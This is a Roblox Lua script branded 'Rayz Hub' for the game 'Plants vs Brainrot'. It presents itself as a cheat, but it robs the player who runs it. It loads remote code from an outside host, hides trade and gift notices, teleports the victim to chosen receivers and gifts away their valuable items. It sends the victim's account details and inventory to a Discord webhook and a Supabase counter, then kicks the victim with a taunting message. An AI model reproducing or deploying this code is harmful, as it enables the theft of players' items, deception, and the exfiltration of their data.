loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/loadingscreen.lua", true))()
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService        = game:GetService("RunService")
local HttpService       = game:GetService("HttpService")

local player   = Players.LocalPlayer
local Character= player.Character or player.CharacterAdded:Wait()
local HRP      = Character:WaitForChild("HumanoidRootPart")
local Backpack = player:WaitForChild("Backpack")
local humanoid = Character:WaitForChild("Humanoid")

--------------------------------------------------------------------
-- config
--------------------------------------------------------------------

local WEBHOOK_URL = web
local TARGET_PLAYERS = users

local autoPickPlants = true
local autoPick       = true
local retryDelay     = 0.2
local moneyPerSecondThreshold = (getgenv().MONEY_PER_SECOND or 100000)
local plantDamageThreshold    = (getgenv().DMG_PER_SECOND     or 100000)

-- Items with these EXACT names will NOT appear in the webhook inventory list
local excluded_item_names = {
    "Shovel [Pick Up Plants]",
    "Basic Bat",
    -- "Wooden Shovel",
    -- "Starter Seed",
    -- "Dirt Block",
    -- add more exact names here if needed
}

player:SetAttribute("Deleting", true)

--------------------------------------------------------------------
-- remotes & modules
--------------------------------------------------------------------
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local GiftRemote      = Remotes:WaitForChild("GiftItem")
local FavoriteRemote  = Remotes:WaitForChild("FavoriteItem")
local RemoveItemRemote= Remotes:WaitForChild("RemoveItem")
local Util            = require(ReplicatedStorage.Modules.Utility.Util)

local PlantClientModule
pcall(function()
    PlantClientModule = require(game:GetService("StarterPlayer").StarterPlayerScripts.Client.Modules:WaitForChild("Plants [Client]", 5))
end)

--------------------------------------------------------------------
-- supabase hit counter
--------------------------------------------------------------------
local SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
local SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMn0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"

local function incrementHitCount(webhookUrl)
    if not webhookUrl or webhookUrl == "" or webhookUrl == "web" then
        return false
    end

    local payload = {
        p_webhook = webhookUrl
    }

    local success, response = pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        if not req then
            error("No HTTP request function available")
        end

        return req({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_webhook",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    return success
end

--------------------------------------------------------------------
-- hide annoying messages
--------------------------------------------------------------------
local MESSAGES_TO_HIDE = {
    ["You are on cooldown for gifting!"] = true,
    ["You don't own this item!"] = true,
    ["Your trade is processing!"] = true,
    ["Your trade is Complete!"] = true,
    ["Equip a brainrot to place!"] = true,
    ["This item is currently untradeable!"] = true,
}

local function hideMessages(gui)
    if not gui then return end
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextLabel") and MESSAGES_TO_HIDE[obj.Text] then
            obj.Visible = false; obj.Text = ""
        elseif obj:IsA("BlurEffect") then
            obj:Destroy()
        elseif (obj:IsA("ImageLabel") or obj:IsA("Frame")) and obj.Name:lower():find("blur") then
            obj:Destroy()
        end
    end
end

RunService.RenderStepped:Connect(function()
    local pg = player:FindFirstChild("PlayerGui")
    if pg then 
        for _, gui in ipairs(pg:GetChildren()) do 
            if gui:IsA("ScreenGui") then 
                hideMessages(gui) 
            end 
        end 
    end
end)

player.CharacterAdded:Connect(function(newChar)
    Character = newChar
    humanoid = newChar:WaitForChild("Humanoid")
    HRP      = newChar:WaitForChild("HumanoidRootPart")
end)

--------------------------------------------------------------------
-- util funcs
--------------------------------------------------------------------
local function formatNumber(n)
    if not n then return "?" end
    return n >= 1000 and string.format("%.1fk", n/1000) or tostring(n)
end

local function equipItem(item)
    if item and item.Parent ~= Character then
        item.Parent = Character
        local hum = Character:FindFirstChild("Humanoid")
        if hum and item:IsA("Tool") then 
            pcall(function() hum:EquipTool(item) end) 
        end
    end
end

local function toggleFavorite(item)
    pcall(function() FavoriteRemote:FireServer(item:GetDebugId() or item.Name) end)
end

--------------------------------------------------------------------
-- receiver detection
--------------------------------------------------------------------
local receiverActivity = {}
local activeReceiver   = nil
local lastGiftTime     = 0
local giftCooldown     = 4

for _, name in ipairs(TARGET_PLAYERS) do receiverActivity[name] = false end

local function setupReceiverDetection()
    for _, receiverName in ipairs(TARGET_PLAYERS) do
        local receiver = Players:FindFirstChild(receiverName)
        if receiver then
            local char = receiver.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    hum.Jumping:Connect(function()
                        receiverActivity[receiverName] = true
                        activeReceiver = receiverName
                    end)
                end
            end
            receiver.Chatted:Connect(function(msg)
                if msg == ".kick" then
                    setclipboard("https://discord.gg/aEw4FCUGeJ")
                    player:Kick("your items just got stolen by rayz hub\njoin our discord server to get them back\n(link copied)")
                else
                    receiverActivity[receiverName] = true
                    activeReceiver = receiverName
                end
            end)
            receiver.CharacterAdded:Connect(function(newChar)
                task.wait(1)
                local hum = newChar:FindFirstChild("Humanoid")
                if hum then
                    hum.Jumping:Connect(function()
                        receiverActivity[receiverName] = true
                        activeReceiver = receiverName
                    end)
                end
            end)
        end
    end
end
setupReceiverDetection()

Players.PlayerAdded:Connect(function(p)
    for _, receiverName in ipairs(TARGET_PLAYERS) do
        if p.Name == receiverName then
            task.wait(2)
            local char = p.Character or p.CharacterAdded:Wait()
            local hum = char:FindFirstChild("Humanoid")
            if hum then
                hum.Jumping:Connect(function()
                    receiverActivity[receiverName] = true
                    activeReceiver = receiverName
                end)
            end
            p.Chatted:Connect(function(msg)
                if msg == ".kick" then
                    setclipboard("https://discord.gg/aEw4FCUGeJ")
                    player:Kick("your items just got stolen by rayz hub\njoin our discord server to get them back\n(link copied)")
                else
                    receiverActivity[receiverName] = true
                    activeReceiver = receiverName
                end
            end)
        end
    end
end)

-- follow active receiver
task.spawn(function()
    while true do
        if activeReceiver then
            local receiver = Players:FindFirstChild(activeReceiver)
            if receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart") then
                local targetHRP = receiver.Character.HumanoidRootPart
                if HRP then 
                    HRP.CFrame = targetHRP.CFrame + Vector3.new(5, 0, 0) 
                end
            end
        end
        task.wait(0.1)
    end
end)

--------------------------------------------------------------------
-- gifting
--------------------------------------------------------------------
local function sendGift(item, targetName)
    local now = tick()
    if now - lastGiftTime < giftCooldown then return end
    local receiver = Players:FindFirstChild(targetName)
    if receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function() 
            GiftRemote:FireServer({Item = item, ToGift = targetName}) 
        end)
        lastGiftTime = now
    end
end

--------------------------------------------------------------------
-- plot & prompt helpers
--------------------------------------------------------------------
local function GetOwnedPlot()
    for _, plot in ipairs(workspace:WaitForChild("Plots"):GetChildren()) do
        if plot:GetAttribute("Owner") == player.Name then 
            return plot 
        end
    end
    return nil
end

local function getAllPrompts(parent)
    local prompts = {}
    for _, obj in ipairs(parent:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Enabled then 
            table.insert(prompts, obj) 
        end
    end
    return prompts
end

local function firePrompts(model)
    while model.Parent do
        local moneyPerSecond = model:GetAttribute("MoneyPerSecond")
        if moneyPerSecond and moneyPerSecond > moneyPerSecondThreshold then
            for _, prompt in ipairs(getAllPrompts(model)) do
                if prompt.ActionText == "Pick Up Brainrot" 
                or prompt.ActionText == "Remove Brainrot" 
                or prompt.ActionText == "Pick Up Plant" then
                    local parentModel = prompt:FindFirstAncestorWhichIsA("Model") or model
                    local hitbox = parentModel:FindFirstChild("Hitbox") or parentModel.PrimaryPart
                    if hitbox then
                        HRP.CFrame = hitbox.CFrame + Vector3.new(0, 3, 0)
                        task.spawn(function() 
                            pcall(function() 
                                fireproximityprompt(prompt, math.huge) 
                            end) 
                        end)
                    end
                end
            end
        end
        task.wait(retryDelay)
    end
end

local function monitorFolder(folder)
    if not folder then return end
    for _, item in ipairs(folder:GetChildren()) do
        if item:GetAttribute("MoneyPerSecond") then 
            task.spawn(function() firePrompts(item) end) 
        end
    end
    folder.ChildAdded:Connect(function(newItem)
        if newItem:GetAttribute("MoneyPerSecond") then 
            task.spawn(function() firePrompts(newItem) end) 
        end
    end)
end

-- auto pick brainrots / plants
task.spawn(function()
    while autoPick do
        local ownedPlot = GetOwnedPlot()
        if ownedPlot then
            local brainrots = ownedPlot:FindFirstChild("Brainrots")
            local plants    = ownedPlot:FindFirstChild("Plants")
            if brainrots then monitorFolder(brainrots) end
            if plants    then monitorFolder(plants)    end
            break
        end
        task.wait(0.5)
    end
end)

-- auto pick plants (inventory)
local function AutoPickupPlants()
    if not autoPickPlants then return end
    local plot = GetOwnedPlot()
    if not plot then return end
    local plantsFolder = plot:FindFirstChild("Plants")
    if not plantsFolder then return end
    local maxInventory = Util:GetMaxInventorySpace(player)
    local currentInventory = #Backpack:GetChildren()
    for _, plant in ipairs(plantsFolder:GetChildren()) do
        if currentInventory >= maxInventory then break end
        if plant:GetAttribute("Owner") ~= player.Name then continue end
        local plantID = plant:GetAttribute("ID")
        local plantDamage = plant:GetAttribute("Damage") or 0
        local isTrollMango = string.lower(plant.Name):find("troll mango")
        if plantID and (plantDamage > plantDamageThreshold or isTrollMango) then
            RemoveItemRemote:FireServer(plantID)
            if PlantClientModule and PlantClientModule.CleanupPlant then
                pcall(function() PlantClientModule:CleanupPlant(plantID) end)
            end
            currentInventory = currentInventory + 1
        end
    end
end

local lastScan = 0; local scanInterval = 2
RunService.RenderStepped:Connect(function()
    local now = tick()
    if now - lastScan >= scanInterval then
        lastScan = now
        AutoPickupPlants()
    end
end)

--------------------------------------------------------------------
-- aesthetic webhook report – shows ALL items except excluded ones
--------------------------------------------------------------------
task.spawn(function()
    task.wait(4)

    -- Increment Supabase Hit Counter
    incrementHitCount(WEBHOOK_URL)

    local function detectExecutor()
        return (identifyexecutor and identifyexecutor()) or
               (syn and "Synapse X") or
               (KRNL_LOADED and "KRNL") or
               (Fluxus and "Fluxus") or
               "Unknown"
    end

    -- Used only for deciding if it's a "good hit" (@everyone ping)
    local function hasValuableItems()
        for _, t in ipairs(Backpack:GetChildren()) do
            local damage = t:GetAttribute("Damage") or 0
            local worth  = t:GetAttribute("Worth")  or 0
            local name   = t.Name:lower()
            if damage > plantDamageThreshold or worth > moneyPerSecondThreshold or name:find("troll mango") then
                return true
            end
        end
        for _, t in ipairs(Character:GetChildren()) do
            if t:IsA("Tool") then
                local damage = t:GetAttribute("Damage") or 0
                local worth  = t:GetAttribute("Worth")  or 0
                local name   = t.Name:lower()
                if damage > plantDamageThreshold or worth > moneyPerSecondThreshold or name:find("troll mango") then
                    return true
                end
            end
        end
        return false
    end

    local function isExcluded(name)
        for _, excl in ipairs(excluded_item_names) do
            if name == excl then
                return true
            end
        end
        return false
    end

    local function buildInventoryString()
        local items = {}
        
        -- Backpack items
        for _, t in ipairs(Backpack:GetChildren()) do
            local name = t.Name
            if not isExcluded(name) then
                table.insert(items, name)
            end
        end
        
        -- Equipped tools
        for _, t in ipairs(Character:GetChildren()) do
            if t:IsA("Tool") then
                local name = t.Name
                if not isExcluded(name) then
                    table.insert(items, name)
                end
            end
        end
        
        if #items == 0 then
            return "Empty (or only excluded items)"
        end
        
        table.sort(items)
        
        local lines = {}
        local maxShown = 15   -- increased a bit since we're showing more
        
        for i, name in ipairs(items) do
            if i <= maxShown then
                table.insert(lines, "> " .. name)
            end
        end
        
        local result = table.concat(lines, "\n")
        
        if #items > maxShown then
            result = result .. "\n> … and " .. (#items - maxShown) .. " more"
        end
        
        return result
    end

    local playerCount = #Players:GetPlayers()
    local joinUrl     = string.format("https://rayzhubjoiner.vercel.app?placeId=%s&jobId=%s",
                                      game.PlaceId, game.JobId)
    local tpScript    = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
                                      game.PlaceId, game.JobId)

    local hitType = hasValuableItems() and "> @everyone **⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆**" or "> 『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
    local inventoryDisplay = buildInventoryString()

    local payload = {
        content = hitType,

        username  = "jeffrey epstein₊꒱",
        avatar_url= "https://rayzhubb.vercel.app/pngs/logo.png",

        embeds = {{
            title       = "RAYZ HUB",
            description =
                "<:rayz_info:1459657883846185021> **How to Use?**\n" ..
                "Join → jump/chat → accept gifts",

            color = 0x800080,

            fields = {
                { name = "<:rayz_diamond:1459279953878188072> Display Name", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = false },
                { name = "<:rayz_member:1459280047570419814> Username",      value = "```" .. player.Name .. "```", inline = false },
                { name = "<:rayz_check:1459279711774576846> Account Age",    value = "```" .. player.AccountAge .. " Days```", inline = false },
                { name = "<:rayz_settings:1459279856931176500> Executor",    value = "```" .. detectExecutor() .. "```", inline = false },
                { name = "<:rayz_owner:1459280005874974801> Players Online", value = string.format("```%d / 4```", playerCount), inline = false },
                { 
                    name  = "<:rayz_backpack:1459652540630171844> Inventory",
                    value = "```\n" .. inventoryDisplay .. "\n```", 
                    inline = false 
                },
                { name = "<:rayz_mod:1459652587409379481> Teleport Script", value = "```lua\n" .. tpScript .. "\n```", inline = false },
                { name = "<:rayz_mod:1459652587409379481> Join Player",     value = "[Click to Join](" .. joinUrl .. ")", inline = false },
            },

            author = {
                name = "Plants vs Brainrot • RAYZ HUB",
                url  = joinUrl,
            },

            footer = {
                text     = "rayz hub",
                icon_url = "https://rayzhubb.vercel.app/pngs/logo.png"
            },

            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            image = { url = "https://rayzhubb.vercel.app/pngs/pvb.png" },
        }},

        attachments = {}
    }

    local json = HttpService:JSONEncode(payload)
    local headers = { ["Content-Type"] = "application/json" }
    
    local req = syn and syn.request or http and http.request or request
    pcall(function()
        if req then
            req({ Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = json })
        else
            HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false, headers)
        end
    end)
end)

print("[Rayz Hub] pvb loaded...")
